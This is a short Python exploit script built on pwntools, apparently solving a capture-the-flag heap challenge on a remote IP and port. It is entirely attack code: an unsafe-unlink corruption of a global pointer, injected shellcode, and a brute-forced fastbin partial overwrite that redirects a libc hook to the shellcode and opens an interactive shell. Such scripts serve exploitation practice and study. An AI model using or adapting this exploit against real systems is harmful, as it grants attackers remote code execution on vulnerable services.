from pwn import*
context(arch='amd64',os='linux')
def add(size,data):
	p.sendlineafter('Your choice :','1')
	p.sendlineafter('Size: ',str(size))
	p.sendafter('Data: ',data)
def free(index):
	p.sendlineafter('Your choice :','2')
	p.sendlineafter('Index: ',str(index))
def edit(index,size,data):
	p.sendlineafter('Your choice :','3')
	p.sendlineafter('Index: ',str(index))
	p.sendlineafter('Size: ',str(size))
	p.sendafter('Data: ',data)
libc = ELF('./libc-2.23.so',checksec=False)
unlink = 0x601040
shell = 0x601000
while True:
	p = remote('111.198.29.45',46050)
	try:
		add(0x80,'\n') #0
		add(0x80,'\n') #1
		payload = p64(0) + p64(0x81)
		payload += p64(unlink - 0x18) + p64(unlink-0x10)
		payload  = payload.ljust(0x80,'\x00')
		payload += p64(0x80) + p64(0x90)
		edit(0,0x90,payload)
		free(1)
		payload = '\x00'*0x18 + p64(shell) + p64(unlink)
		edit(0,0x30,payload)
		shellcode = asm(shellcraft.sh())
		edit(0,len(shellcode),shellcode)
		#2 -> 3 -> 4 ->5
		add(0x10,'\n') 
		add(0x90,'\n')
		add(0x60,'\n')
		add(0x60,'\n')
		free(3)
		add(0x90,p16(0x4B10 - 0x23))
		free(4)
		free(5)
		edit(2,0x20,'\x00'*0x10+p64(0) + p64(0x71))
		edit(5,1,'\x30')
		edit(1,16,p64(0)*2)
		add(0x60,'\n')
		add(0x60,'\n')
		add(0x60,'\x00'*0x13 + p64(shell))
		p.sendlineafter('Your choice :','1')
		p.sendlineafter('Size: ','16')
		break
	except:
		p.close()
		continue
p.interactive()
